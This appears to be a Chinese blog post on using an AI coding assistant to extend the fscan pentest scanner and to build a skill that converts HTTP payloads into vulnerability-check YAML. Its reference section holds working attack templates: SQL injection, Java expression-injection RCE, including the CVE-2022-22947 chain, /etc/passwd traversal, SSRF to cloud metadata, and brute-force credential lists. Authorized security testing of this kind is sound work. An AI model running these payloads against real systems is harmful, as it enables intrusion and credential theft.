命中后会在指定目录生成 {poc_name}_{url_hash}_{timestamp}.txt 文件，包含完整的请求头/请求体和响应头/响应体。
````

{{< /details >}}

M2.5 完美完成任务，可以用这样的指令

```bash
./fscan -hs ./poc-output -u http://target.com -pocname poc-yaml-name
```

效果如图：

![请求响应包格式](image-1.png)

## Skill 自动化

### 从 payload 生成 fscan poc yaml

二次开发工作完成之后，不再需要关心代码结构。因此先清理一下 CLAUDE.md

> 清理 CLAUDE.md 中关于代码架构描述的部分，将它清理到其他 markdown 文件, 只保留项目后续被使用时需要被关注的设计要点，以及我们新增的两个功能内容，即 -hs 参数和新增的 poc yaml 语法。

{{< details summary="精简 CLAUDE.md 并迁移架构文档" >}}

````markdown
CLAUDE.md 目前包含大量代码架构细节（包结构、并发模型、插件注册等），导致文件冗长，不易快速查阅。用户希望将这些内容迁移至独立文档，让 CLAUDE.md 只保留两类内容：

1. 后续开发必须关注的设计要点（如 embed 编译注意、插件注册模式、错误处理）
2. 我们新增的两个功能：search 字段扩展 和 -hs 参数

方案

新建文件

docs/architecture.md — 迁移以下内容：
- 架构总览（主要执行流程）
- 包结构（各目录/文件说明）
- 插件注册系统（含代码示例）
- 并发模型
- 重要扫描模式（-m 参数）
- 端口组说明
- WebScan 模块架构（核心组件、工作流程）
- POC YAML 基础格式
- 关键全局变量
- 值得注意的实现细节
- 编译参数详细说明（ldflags、trimpath、build tags、embed）
- 常用编译命令组合（包括交叉编译脚本）

精简后的 CLAUDE.md 结构

保留以下内容：

1. 项目概述（一行简介，不变）
2. 构建和开发命令（精简）
- 只保留最常用的两条命令：开发版和生产版
- 跨平台编译示例仅保留一行说明，指向 architecture.md
- 保留依赖管理和运行示例（简短）
- 保留测试说明
3. 常见开发模式（保留，这是"设计要点"）
- 添加新服务插件的步骤
- 添加新 POC（含 embed 编译警告）
- 错误处理约定
4. 新增功能：search 字段扩展（完整保留）
- 说明、YAML 示例、输出格式、实现细节
5. 新增功能：-hs 参数（POC 请求响应保存）（完整保留）
6. 安全和授权上下文（保留一句话）

关键文件

- /Users/veno/Projects/fscan/CLAUDE.md — 精简修改
- /Users/veno/Projects/fscan/docs/architecture.md — 新建，接收迁移内容

执行步骤

1. 新建 docs/architecture.md，将架构相关内容（执行流程、包结构、插件系统、并发模型、扫描模式、端口组、WebScan
架构、全局变量、实现细节、详细编译参数）全部迁移进去
2. 改写 CLAUDE.md：删除已迁移内容，补充一行 > 详细架构说明见 [docs/architecture.md](docs/architecture.md)，保留开发模式、两个新功能、安全上下文

验证

- 读取改写后的 CLAUDE.md，确认内容简洁、新功能说明完整
- 读取 docs/architecture.md，确认迁移内容完整无遗漏
````

{{< /details >}}

> 此处需要调整。我们后续不会继续进行开发，因此不需要测试说明，依赖管理，开发模式。fscan 作为渗透工具，跨平台编译示例是关键的，后续使用时需要反复重新构建。需要保留。着重讲清楚如何添加和使用新的 poc yaml，强调 poc yaml 模板会被编译进二进制。

{{< details summary="精简 CLAUDE.md 并迁移架构文档" >}}

````markdown
CLAUDE.md 目前包含大量代码架构细节（包结构、并发模型、插件注册等），导致文件冗长，不易快速查阅。用户希望将这些内容迁移至独立文档，让 CLAUDE.md 只保留两类内容：

1. 使用该工具时必须关注的要点：跨平台构建命令、POC YAML 的编写与部署（含 embed 编译警告）
2. 我们新增的两个功能：search 字段扩展 和 -hs 参数

注：后续不再继续开发，因此删除开发模式、依赖管理、测试说明等内容。

方案

新建文件

docs/architecture.md — 迁移以下内容：
- 架构总览（主要执行流程）
- 包结构（各目录/文件说明）
- 插件注册系统（含代码示例）
- 并发模型
- 重要扫描模式（-m 参数）
- 端口组说明
- WebScan 模块架构（核心组件、工作流程）
- 关键全局变量
- 值得注意的实现细节

精简后的 CLAUDE.md 结构

1. 项目概述（一行简介）
2. 构建（完整保留跨平台编译示例）
- 开发版 / 生产版命令
- 跨平台编译：Windows、Linux、macOS（amd64/arm64）
- Embed 重要提示：新增或修改 POC 后必须重新编译
- 运行示例（基本扫描、指定端口等）
3. POC YAML 使用指南（核心内容）
- POC 存放位置：WebScan/pocs/
- 重要：POC 通过 //go:embed 编译进二进制，修改后必须重新编译
- 临时方案：-pocpath <目录> 不需重编译
- 基础 POC YAML 格式示例
- sets 爆破字典语法示例
4. 新增功能：search 字段扩展（完整保留）
- 说明、YAML 示例、输出格式、实现位置
5. 新增功能：-hs 参数（POC 请求响应保存）（完整保留）
6. 安全和授权上下文（一句话）

关键文件

- /Users/veno/Projects/fscan/CLAUDE.md — 精简修改
- /Users/veno/Projects/fscan/docs/architecture.md — 新建，接收迁移内容

执行步骤

1. 新建 docs/architecture.md，迁移所有架构细节
2. 改写 CLAUDE.md：删除已迁移内容，聚焦构建、POC 使用、两个新功能

验证

- 读取改写后的 CLAUDE.md，确认简洁、POC 使用说明完整、新功能说明完整
- 读取 docs/architecture.md，确认迁移内容完整
````

{{</details>}}

{{< details summary="修改后的 CLAUDE.md" >}}

````markdown
# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

详细架构文档见 [docs/architecture.md](docs/architecture.md)。

## 项目概述

fscan 是一个用 Go 语言编写的内网综合扫描工具。支持主机存活探测、端口扫描、服务爆破、漏洞检测（包括 MS17-010、SMB Ghost）、Web 指纹识别，以及基于 YAML 格式的 Web 漏洞扫描（兼容 xray POC 格式）。

## 构建

```bash
# 开发调试版本（保留调试信息）
go build -o fscan main.go

# 生产发布版本（体积优化）
go build -ldflags="-s -w" -trimpath -o fscan main.go

# 跨平台编译
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o fscan_windows_amd64.exe main.go
GOOS=linux   GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o fscan_linux_amd64 main.go
GOOS=darwin  GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o fscan_darwin_amd64 main.go
GOOS=darwin  GOARCH=arm64 go build -ldflags="-s -w" -trimpath -o fscan_darwin_arm64 main.go
```

> **重要**：`WebScan/pocs/` 目录下的 POC YAML 文件通过 `//go:embed pocs` 在**编译期**打包进二进制。新增或修改 POC 后，必须重新编译才能生效。

```bash
# 运行示例
go run main.go -h 192.168.1.1/24
go run main.go -h 192.168.1.1/24 -m ssh
go run main.go -h 192.168.1.1/24 -p 22,80,443
```

## POC YAML 使用指南

POC 文件存放于 `WebScan/pocs/`，兼容 xray 格式。

**临时加载外部 POC（无需重编译）**：使用 `-pocpath <目录>` 从文件系统加载。

### 基础格式

```yaml
name: poc-name
transport: http
rules:
  - method: GET
    path: /vulnerable/path
    expression: response.status == 200 && response.body.bcontains(b'marker')
```

### 爆破字典（sets）

```yaml
name: poc-yaml-bruteforce
sets:
  - key: user
    value: ["admin", "root"]
  - key: pass
    value: ["admin", "123456"]
rules:
  - method: POST
    path: /login
    body: '{"user":"{{user}}","pass":"{{pass}}"}'
    expression: response.status == 200 && response.body.bcontains(b'success')
```

## 新增功能：search 字段扩展

原版 xray 格式的 `search` 字段仅用于提取命名捕获组并注入到后续 rule 的变量替换中。本项目在此基础上扩展：**所有命名捕获组的值会在 POC 命中时一并打印到输出**，适用于提取 accessToken、凭据、版本号等敏感信息。

**语法**：在任意 rule 中添加 `search` 字段，使用 Python 风格的命名捕获组 `(?P<name>...)`：

```yaml
name: poc-yaml-example-with-extraction
transport: http
rules:
  - method: POST
    path: /api/auth
    body: '{"username":"admin","password":"admin"}'
    search: '"accessToken":"(?P<accessToken>[^"]+)".*?"username":"(?P<username>[^"]+)"'
    expression: response.status == 200 && response.body.bcontains(b'accessToken')
```

命中时输出格式：

```text
[+] PocScan http://10.0.0.1:8848 poc-yaml-example-with-extraction
    * accessToken: eyJhbGc...
    * username: nacos
```

**说明**：

- `search` 匹配范围为 `响应头 + 响应体` 的拼接字符串
- 多个 rule 中的 `search` 均会被收集，后续 rule 提取的变量会覆盖同名变量
- 提取的变量同时注入 `variableMap`，可在后续 rule 中通过 `{{varName}}` 引用
- key 按字母序排列输出，空 key（未命名组）自动忽略
- 实现位置：`WebScan/lib/check.go`，函数 `executePoc` 和 `CheckMultiPoc`

## 新增功能：-hs 参数（POC 请求响应保存）

当 POC 命中时，可使用 `-hs <目录>` 参数保存触发漏洞的 HTTP 请求和响应：

```bash
fscan -hs ./poc-output -u http://target.com -pocname weblogic
```

命中后会在指定目录生成 `{poc_name}_{url_hash}_{timestamp}.txt` 文件，包含完整的请求头/请求体和响应头/响应体。

## 安全和授权上下文

此工具专为经授权的渗透测试和安全评估而设计，使用前须获得合法授权。

````

{{</details>}}

现在可以用这个 CLAUDE.md 让 Claude Code 写 Skills

> 编写一个 skill，用户提供 payload，根据规则生成对应的 fscan poc yaml

```text
skill 的主要输入格式是什么？

❯ 1. [ ] Raw HTTP 请求（Burp Suite 格式）
  粘贴完整 HTTP 请求：GET/POST 行 + headers + body
  2. [ ] curl 命令
  粘贴 curl 命令，skill 解析成 POC
  3. [ ] 漏洞描述 + URL
  用自然语言描述漏洞，skill 推断结构
  4. [ ] 已有 exploit 代码（Python/Go 等）
  粘贴 exploit 脚本，skill 提取 HTTP 逻辑
  5. [ ] Type something
     Submit
```

此处认为，这一个 skill 更适合限制在 Raw HTTP 请求，这是最稳的。应该把第三点单独做成另一个 skill。因此选择第一个。但事实上，都已经是 skill 了，其实区别不会很大。

{{< details summary="Plan: fscan POC YAML Generator Skill" >}}

````markdown
# Plan: fscan POC YAML Generator Skill

## Context

Users working with fscan need to convert vulnerability payloads (raw HTTP requests, curl commands, exploit descriptions) into properly formatted fscan POC YAML files. Manually writing these files requires knowing the format spec, CEL expression syntax, and naming conventions. A skill automates this conversion and enforces project conventions defined in CLAUDE.md.

## Skill Location

```
~/.claude/skills/fscan-poc-gen/
├── SKILL.md                  # Main skill (trigger + instructions)
└── references/
    └── poc-format.md         # Field reference, CEL functions, type templates
```

Global placement at `~/.claude/skills/` makes the skill available across all projects.

## Files to Create

### 1. `~/.claude/skills/fscan-poc-gen/SKILL.md`

**Frontmatter:**
- `name: fscan-poc-gen`
- `description`: trigger phrases like "生成 POC", "写一个 poc", "convert this payload to POC yaml", "generate fscan poc", "create poc yaml", "把这个 payload 转成 poc"
- `version: 0.1.0`

**Body content (imperative form, ~800 words):**

1. **Input parsing** — identify from user's payload:
   - HTTP method (GET/POST/PUT/DELETE/HEAD)
   - Path (URL path only, strip host)
   - Headers (Content-Type, Cookie, Authorization, custom headers)
   - Body (raw body, JSON, form-encoded)
   - Vulnerability type hint (SQLi, RCE, LFI, SSRF, unauth, weak-password, info-leak)

2. **Naming convention:**
   - Format: `{vendor}-{product}-{cve-or-cnvd-or-type}.yml`
   - POC `name` field: `poc-yaml-{vendor}-{type}` (all lowercase, hyphens)
   - If CVE is known: include it (e.g., `poc-yaml-spring-cve-2022-22947`)
   - Ask user if vendor/name is unclear

3. **Variable decisions:**
   - Use `set` with `randomInt`/`randomLowercase` for RCE proof-of-exploit (avoid hardcoded magic strings)
   - Use `sets` only for brute-force/weak-password POCs
   - Omit `set`/`sets` for detection-only POCs

4. **Expression rules by vulnerability type:**
   - SQLi: detect DB error strings or injected markers (`bcontains(b"error-string")`)
   - RCE (blind): use `rand1 + rand2` math — generate two random ints, inject `expr {{rand1}} + {{rand2}}` into payload, check `response.body.bcontains(bytes(string(rand1 + rand2)))`
   - RCE (reflected): detect command output in body
   - LFI/path traversal: detect file content signatures (e.g., `root:x:0:0`)
   - SSRF: detect internal service responses
   - Unauth access: `response.status == 200 && response.body.bcontains(b"sensitive-marker")`
   - Info leak: use `search` with named capture groups to extract and print leaked data
   - Weak password: multi-rule — first GET to get session/CSRF, then POST login, check redirect or session marker

5. **`search` field usage:**
   - Add when response contains extractable sensitive data (tokens, credentials, version info)
   - Pattern: `(?P<varname>[^"]+)` style named groups
   - Extracted vars are printed on match and available in subsequent rules via `{{varname}}`

6. **Multi-rule POCs:**
   - Rule N+1 depends on data from rule N via `search` extraction
   - Each intermediate rule: set `expression` to verify step succeeded
   - Final rule: expression verifies full exploit chain

7. **Output:**
   - Print the complete YAML to conversation (not write to file, unless user asks)
   - Suggest filename following naming convention
   - Note if embedded in binary: must recompile after adding to `WebScan/pocs/`

### 2. `~/.claude/skills/fscan-poc-gen/references/poc-format.md`

Detailed reference (loaded on demand):
- All YAML fields with types and descriptions
- Full CEL function list (bcontains, icontains, bmatches, base64, randomInt, randomLowercase, etc.)
- `set` vs `sets` detailed explanation
- `follow_redirects` usage
- `continue` field explanation
- `detail` metadata fields
- Complete template for each vulnerability category (SQLi, RCE-blind, RCE-reflect, LFI, unauth, weak-password, info-leak, multi-step)
- Real examples from the codebase (abbreviated)

## Skill Trigger Examples

```
"帮我把这个 HTTP 请求生成 fscan poc"
"generate a poc yaml for this CVE"
"写一个 weblogic 弱口令的 poc"
"把这个 curl 命令转成 poc yaml"
"我有一个 SQL 注入 payload，帮我生成 poc"
```

## Verification

After creation:
1. Restart Claude Code or reload plugins
2. Paste a sample raw HTTP request and ask: "帮我生成 fscan poc yaml"
3. Verify skill triggers and produces valid YAML
4. Build fscan: `go build -o fscan main.go` — should succeed with the generated YAML placed in `WebScan/pocs/`
5. Test: `./fscan -u http://target -pocname <poc-name>` — should run without panic
````

{{</details>}}

跑完之后的总结如下：

```text
Done. Here's what was created:

  ~/.claude/skills/fscan-poc-gen/
  ├── SKILL.md                      (258 lines)
  └── references/
      └── poc-format.md             (445 lines)

  SKILL.md covers the full generation workflow:
  - Input parsing (method, path, headers, body, vuln type)
  - Naming conventions (poc-yaml-{vendor}-{type}, filename patterns)
  - Variable decisions — when to use set (RCE rand proof) vs sets (brute-force)
  vs neither
  - Expression rules for every vuln type: SQLi, RCE blind, RCE reflect, LFI,
  SSRF, unauth, info-leak, weak-password
  - search field usage for extracting tokens/credentials/versions
  - Multi-rule chain patterns with cleanup
  - Output instructions (print YAML, suggest filename, recompile note)
  - Quick templates inline

  poc-format.md is the detailed reference loaded on demand:
  - Every YAML field with type and description
  - Full CEL function table (bcontains, icontains, bmatches, bytes, string,
  base64, randomInt, etc.)
  - set vs sets semantics
  - Complete templates for all 11 vulnerability categories, drawn from real POC
  files in the codebase
  - Common mistakes and a naming reference table

  To use: restart Claude Code or start a new session so the skill is loaded, then
   paste an HTTP request or curl command and say "帮我生成 fscan poc yaml" — the
  skill will trigger automatically.
```

{{< details summary="SKILL.md" >}}

````markdown
---
name: fscan-poc-gen
description: >
  Generates fscan-compatible POC YAML files from raw inputs. Triggers on:
  "生成 POC", "写一个 poc", "帮我生成 poc", "convert this payload to POC yaml",
  "generate fscan poc", "create poc yaml", "把这个 payload 转成 poc",
  "帮我把这个 HTTP 请求生成 fscan poc", "generate a poc yaml for this CVE",
  "写一个弱口令的 poc", "把这个 curl 命令转成 poc yaml",
  "我有一个 SQL 注入 payload，帮我生成 poc", "生成 fscan yaml",
  "convert to fscan poc", "fscan poc 怎么写"
version: 0.1.0
---

You are an expert at generating fscan POC YAML files. When triggered, follow these steps precisely to produce a correct, complete POC.

## Step 1: Parse the Input

Identify each of these from the user's payload, HTTP request, curl command, or description:

- **HTTP method**: GET / POST / PUT / DELETE / HEAD (default GET if unspecified)
- **Path**: URL path only — strip the scheme and host (e.g., from `http://target.com/api/foo` take `/api/foo`)
- **Headers**: Extract Content-Type, Cookie, Authorization, X-* custom headers. Omit Host, Connection, Content-Length — fscan injects these automatically.
- **Body**: Raw body string, JSON object, or form-encoded data. Preserve exact whitespace if relevant.
- **Vulnerability type**: classify as one of: `sqli`, `rce-blind`, `rce-reflect`, `lfi`, `ssrf`, `unauth`, `info-leak`, `weak-password`, `detect`.

If the input is ambiguous (e.g., no clear host/path split, no obvious vuln type), ask the user before proceeding.

## Step 2: Choose the POC Name and Filename

**POC `name` field** — lowercase, hyphen-separated, prefixed `poc-yaml-`:
- Pattern: `poc-yaml-{vendor}-{product}-{type}`
- With CVE: `poc-yaml-{vendor}-cve-{year}-{id}`
- Examples: `poc-yaml-weblogic-console-weak`, `poc-yaml-spring-cve-2022-22947`

**Filename** — follows: `{vendor}-{product}-{cve-or-type}.yml`
- Examples: `weblogic-console-weak.yml`, `spring-cve-2022-22947.yml`

If vendor or product name is unclear from the input, ask the user.

## Step 3: Decide Variables (`set` / `sets`)

**`set`** — single values computed once at runtime:
- Use `randomInt(min, max)` for RCE math-proof integers.
- Use `randomLowercase(n)` for random path segments or usernames used for cleanup.
- Omit entirely for detection-only or static POCs.

**`sets`** — cartesian product for brute-force:
- Use only for weak-password / credential-stuffing POCs.
- List each credential variant. Keep lists concise (≤10 entries); note the user can extend them.

**For RCE blind verification**, always generate two random integers:
```yaml
set:
  rand1: randomInt(800000000, 1000000000)
  rand2: randomInt(800000000, 1000000000)
```
Inject `{{rand1}}` and `{{rand2}}` into the payload math expression, then verify `response.body.bcontains(bytes(string(rand1 + rand2)))` in a later rule.

## Step 4: Write Expression by Vulnerability Type

**SQLi**
```
response.body.bcontains(b"sql-error-string") || response.body.bcontains(b"injected-marker")
```
Common SQL error markers: `You have an error in your SQL`, `SQLSTATE`, `ORA-`, `Microsoft OLE DB`, `Syntax error`.

**RCE (blind math)**
Inject `expr {{rand1}} + {{rand2}}` or equivalent arithmetic. Verify:
```
response.body.bcontains(bytes(string(rand1 + rand2)))
```

**RCE (reflected output)**
Run a safe command like `id` or `echo marker`. Verify:
```
"(uid|gid|groups)=[0-9]+".bmatches(response.body) || response.body.bcontains(b"marker")
```
Or check response header for injected output:
```
"((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.raw_header)
```

**LFI / Path Traversal**
```
response.body.bcontains(b"root:x:0:0") || response.body.bcontains(b"[boot loader]")
```

**SSRF**
Detect internal service response or DNS interaction marker:
```
response.status == 200 && response.body.bcontains(b"internal-marker")
```

**Unauth Access**
```
response.status == 200 && response.body.bcontains(b"sensitive-page-marker")
```

**Info Leak**
Use `search` field (see Step 5). Expression confirms the field exists:
```
response.status == 200 && response.body.bcontains(b"leaked-field-name")
```

**Weak Password**
Multi-rule: first verify the login endpoint exists (status check), then attempt auth. Check success marker (redirect, session cookie, dashboard content):
```yaml
rules:
  - method: GET
    path: /admin/
    expression: response.status == 401 || response.body.bcontains(b"Login")
  - method: POST
    path: /admin/login
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: username={{username}}&password={{password}}
    expression: response.status == 302 || response.body.bcontains(b"Dashboard")
```

**Detect / Fingerprint**
Simple presence check:
```
response.status == 200 && response.body.bcontains(b"<title>Product Name</title>")
```

## Step 5: Add `search` Field for Info Extraction

Add `search` when the response contains extractable sensitive data: tokens, credentials, version strings, API keys.

- Syntax: Python-style named capture groups `(?P<varname>pattern)`
- Match scope: concatenated response headers + response body
- Extracted values are printed when POC matches AND injected into `variableMap` for use in subsequent rules via `{{varname}}`

Example for token extraction:
```yaml
  - method: POST
    path: /api/auth
    body: '{"username":"admin","password":"admin"}'
    search: '"accessToken":"(?P<token>[^"]+)"'
    expression: response.status == 200 && response.body.bcontains(b"accessToken")
```

Example chaining extracted var into next rule:
```yaml
  - method: GET
    path: /api/admin/users
    headers:
      Authorization: Bearer {{token}}
    expression: response.status == 200
```

## Step 6: Multi-Rule Chains

When the exploit requires multiple HTTP round-trips:
1. Each intermediate rule verifies its step succeeded with a focused `expression`.
2. The final rule carries the definitive detection expression.
3. Use `search` in intermediate rules to extract session tokens, CSRF values, etc. for later rules.
4. For RCE cleanup (e.g., delete a created route), add cleanup rules after the verification rule.
5. Avoid `continue: true` unless you explicitly need to collect results from a failing rule — by default all rules must pass for the POC to match.

## Step 7: Optional Fields

- `follow_redirects: true` — only add when the exploit requires following a redirect (e.g., login flows). Default is false.
- `detail` block — always include at minimum `author` and `links`. Add `description` for non-obvious vulns.

```yaml
detail:
  author: your-handle
  description: One-line vuln description
  links:
    - https://nvd.nist.gov/vuln/detail/CVE-XXXX-XXXXX
```

## Step 8: Output

1. Print the **complete YAML** in a fenced code block labeled `yaml`.
2. Suggest the **filename** following naming convention.
3. If the user wants to embed it in the binary, remind them:
   > Place in `WebScan/pocs/` then recompile: `go build -o fscan main.go`
   > POC files are embedded at compile time via `//go:embed pocs`.
4. Do **not** write the file to disk unless the user explicitly asks.

## Quick Templates

**Detection-only:**
```yaml
name: poc-yaml-{vendor}-{product}-detect
rules:
  - method: GET
    path: /path/to/check
    expression: response.status == 200 && response.body.bcontains(b"unique-marker")
detail:
  author: handle
  links:
    - https://...
```

**RCE blind (math proof):**
```yaml
name: poc-yaml-{vendor}-{product}-rce
set:
  rand1: randomInt(800000000, 1000000000)
  rand2: randomInt(800000000, 1000000000)
rules:
  - method: POST
    path: /vulnerable/endpoint
    headers:
      Content-Type: application/json
    body: '{"cmd":"expr {{rand1}} + {{rand2}}"}'
    expression: response.body.bcontains(bytes(string(rand1 + rand2)))
detail:
  author: handle
  links:
    - https://...
```

**Info leak with extraction:**
```yaml
name: poc-yaml-{vendor}-{product}-info-leak
rules:
  - method: GET
    path: /api/sensitive
    search: '"apiKey":"(?P<apiKey>[^"]+)".*?"username":"(?P<username>[^"]+)"'
    expression: response.status == 200 && response.body.bcontains(b"apiKey")
detail:
  author: handle
  links:
    - https://...
```

**Weak password (sets):**
```yaml
name: poc-yaml-{vendor}-{product}-weak
sets:
  username:
    - admin
    - administrator
  password:
    - admin
    - admin123
    - password
rules:
  - method: GET
    path: /login
    expression: response.status == 200 && response.body.bcontains(b"Login")
  - method: POST
    path: /login
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: username={{username}}&password={{password}}
    expression: response.status == 302 || response.body.bcontains(b"Dashboard")
detail:
  author: handle
  links:
    - https://...
```

For full field reference and CEL function list, see `references/poc-format.md`.
````

{{</details>}}

{{< details summary="references/poc-format.md" >}}

````markdown
# fscan POC YAML Format Reference

This document is a detailed reference for writing fscan POC YAML files. It covers every field, all CEL functions, type-specific templates, and real-world examples derived from the codebase.

---

## Top-Level Fields

| Field       | Type              | Required | Description |
|-------------|-------------------|----------|-------------|
| `name`      | string            | yes      | Unique POC identifier. Convention: `poc-yaml-{vendor}-{type}` |
| `transport` | string            | no       | Always `http` (default). Only field value supported. |
| `set`       | map[string]expr   | no       | Single-value variables computed once at runtime |
| `sets`      | list of key+value | no       | Multi-value cartesian product (brute-force only) |
| `rules`     | list of Rule      | yes      | Ordered list of HTTP requests to execute |
| `detail`    | Detail            | no       | Metadata: author, description, links |

---

## Rule Fields

| Field              | Type              | Required | Description |
|--------------------|-------------------|----------|-------------|
| `method`           | string            | yes      | HTTP method: GET, POST, PUT, DELETE, HEAD, OPTIONS |
| `path`             | string            | yes      | URL path. May include `{{varname}}` placeholders |
| `headers`          | map[string]string | no       | Additional request headers. Do NOT include Host, Content-Length. |
| `body`             | string            | no       | Request body. Supports `{{varname}}` substitution. Use `\|` for multiline. |
| `expression`       | string (CEL)      | yes      | CEL expression that must evaluate to `true` for rule to pass |
| `search`           | string (regex)    | no       | Regex with named groups `(?P<name>...)` applied to `header+body`. Extracts vars. |
| `follow_redirects` | bool              | no       | Follow HTTP redirects. Default: `false` |
| `continue`         | bool              | no       | Continue to next rule even if this one fails. Default: `false` |

**Rule execution**: All rules must pass (return true) for the POC to be considered a match. Rules execute in order. A failing rule (unless `continue: true`) aborts the chain.

---

## `set` Field

Single-value variables resolved once at the start of POC execution. Available in all rules via `{{varname}}` in path/headers/body and as bare `varname` in CEL expressions.

```yaml
set:
  rand1: randomInt(800000000, 1000000000)
  rand2: randomInt(800000000, 1000000000)
  token: randomLowercase(16)
  router: randomLowercase(8)
```

Variables are also accessible in `expression` without `{{}}`:
```yaml
expression: response.body.bcontains(bytes(string(rand1 + rand2)))
```

---

## `sets` Field

Cartesian product expansion for brute-force POCs. Each combination of values produces a separate rule execution attempt. Use sparingly — only for weak-password or credential-spraying scenarios.

```yaml
sets:
  username:
    - admin
    - administrator
    - root
  password:
    - admin
    - admin123
    - password123
    - ""
```

Values are substituted via `{{username}}` and `{{password}}` in rule body/path/headers.

**Important**: `sets` and `set` are mutually exclusive at the top level. Do not use both.

---

## `detail` Field

```yaml
detail:
  author: handle(https://github.com/handle)
  description: |
    Multi-line description of the vulnerability.
    Include CVE number, affected versions, and attack conditions.
  info: short one-liner
  login: default-user/default-pass   # for weak-password POCs
  links:
    - https://nvd.nist.gov/vuln/detail/CVE-XXXX-XXXXX
    - https://vendor.com/security-advisory
```

---

## CEL Expression Language

Expressions are written in Google CEL. The response object and all `set` variables are available.

### Response Object Fields

| Field                        | Type   | Description |
|------------------------------|--------|-------------|
| `response.status`            | int    | HTTP status code |
| `response.body`              | bytes  | Response body as bytes |
| `response.raw_header`        | bytes  | Raw response headers as bytes |
| `response.content_type`      | string | Content-Type header value |
| `response.headers`           | map    | Response headers map (lowercase keys) |
| `response.title`             | string | HTML `<title>` tag content |
| `response.latency`           | int    | Response time in milliseconds |

### Bytes / String Functions

| Function | Signature | Description |
|----------|-----------|-------------|
| `bcontains` | `(bytes).bcontains(bytes) bool` | Case-sensitive bytes substring check |
| `icontains` | `(string).icontains(string) bool` | Case-insensitive string contains |
| `bmatches` | `(string).bmatches(bytes) bool` | Regex match against bytes |
| `bmatches` | `(string).bmatches(string) bool` | Regex match against string |
| `bytes(s)` | `bytes(string) bytes` | Convert string to bytes |
| `string(b)` | `string(int) string` | Convert int to string |
| `base64(s)` | `base64(string) string` | Base64 encode string |
| `base64Decode(s)` | `base64Decode(string) string` | Base64 decode |
| `substr(s,start,end)` | `substr(string,int,int) string` | Substring extraction |
| `len(s)` | `len(bytes\|string) int` | Length |

### Random Value Functions (for `set` values only)

| Function | Description |
|----------|-------------|
| `randomInt(min, max)` | Random integer in `[min, max)` |
| `randomLowercase(n)` | Random lowercase ASCII string of length n |

### Arithmetic in CEL

You can do math directly in expressions:
```yaml
expression: response.body.bcontains(bytes(string(rand1 + rand2)))
```

---

## Vulnerability Type Templates

### 1. Detection / Fingerprint

```yaml
name: poc-yaml-vendor-product-detect
rules:
  - method: GET
    path: /product/path
    follow_redirects: true
    expression: >
      response.status == 200 &&
      response.body.bcontains(b"<title>Product</title>")
detail:
  author: handle
  links:
    - https://vendor.com
```

### 2. Unauthenticated Access

```yaml
name: poc-yaml-vendor-product-unauth
rules:
  - method: GET
    path: /api/admin/users
    follow_redirects: false
    expression: >
      response.status == 200 &&
      response.content_type.icontains("application/json") &&
      response.body.bcontains(b"\"username\"")
detail:
  author: handle
  links:
    - https://...
```

### 3. SQL Injection

```yaml
name: poc-yaml-vendor-product-sqli
rules:
  - method: GET
    path: /index.php?id=1%27%20AND%201%3D2%20UNION%20SELECT%20NULL,NULL,NULL--
    expression: >
      response.body.bcontains(b"You have an error in your SQL syntax") ||
      response.body.bcontains(b"mysql_fetch") ||
      response.body.bcontains(b"ORA-01756")
detail:
  author: handle
  links:
    - https://...
```

Time-based blind (check latency):
```yaml
    expression: response.latency > 5000
```

Error-based with injected marker (MD5 partial match from codebase pattern):
```yaml
    path: /index.php?id=1") AND extractvalue(1,concat(0x7e,md5(99999999)))-- a
    expression: response.body.bcontains(b"ef775988943825d2871e1cfa75473ec")
```
(The above uses md5(99999999) = `ef775988...`; verify and substitute actual value.)

### 4. RCE — Blind Math Proof (Recommended)

```yaml
name: poc-yaml-vendor-product-rce
set:
  rand1: randomInt(800000000, 1000000000)
  rand2: randomInt(800000000, 1000000000)
rules:
  - method: POST
    path: /vulnerable/endpoint
    headers:
      Content-Type: application/json
    body: |
      {"expression": "#{new java.lang.Runtime().exec(\"expr {{rand1}} + {{rand2}}\")}"}
    expression: response.body.bcontains(bytes(string(rand1 + rand2)))
detail:
  author: handle
  links:
    - https://...
```

### 5. RCE — Reflected Output

```yaml
name: poc-yaml-vendor-product-rce
rules:
  - method: GET
    path: /exec?cmd=id
    expression: >
      "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
detail:
  author: handle
  links:
    - https://...
```

RCE via response header injection (e.g. CVE-2022-26134 style):
```yaml
    expression: >
      response.status == 302 &&
      "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.raw_header)
```

### 6. RCE — Multi-Step with Cleanup (Spring Cloud Gateway style)

```yaml
name: poc-yaml-spring-cve-2022-22947
set:
  router: randomLowercase(8)
  rand1: randomInt(800000000, 1000000000)
  rand2: randomInt(800000000, 1000000000)
rules:
  - method: POST
    path: /actuator/gateway/routes/{{router}}
    headers:
      Content-Type: application/json
    body: |
      {"id":"{{router}}","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"expr\",\"{{rand1}}\",\"+\",\"{{rand2}}\"})}"}}],"uri":"http://example.com","order":0}
    expression: response.status == 201
  - method: POST
    path: /actuator/gateway/refresh
    headers:
      Content-Type: application/json
    expression: response.status == 200
  - method: GET
    path: /actuator/gateway/routes/{{router}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(rand1 + rand2)))
  - method: DELETE
    path: /actuator/gateway/routes/{{router}}
    expression: response.status == 200
  - method: POST
    path: /actuator/gateway/refresh
    headers:
      Content-Type: application/json
    expression: response.status == 200
detail:
  author: jweny
  description: Spring Cloud Gateway Code Injection
  links:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-22947
```

### 7. LFI / Path Traversal

```yaml
name: poc-yaml-vendor-product-lfi
rules:
  - method: GET
    path: /download?file=../../../../etc/passwd
    expression: >
      response.status == 200 &&
      response.body.bcontains(b"root:x:0:0")
detail:
  author: handle
  links:
    - https://...
```

### 8. SSRF

```yaml
name: poc-yaml-vendor-product-ssrf
rules:
  - method: POST
    path: /api/fetch
    headers:
      Content-Type: application/json
    body: '{"url":"http://169.254.169.254/latest/meta-data/"}'
    expression: >
      response.status == 200 &&
      response.body.bcontains(b"ami-id")
detail:
  author: handle
  links:
    - https://...
```

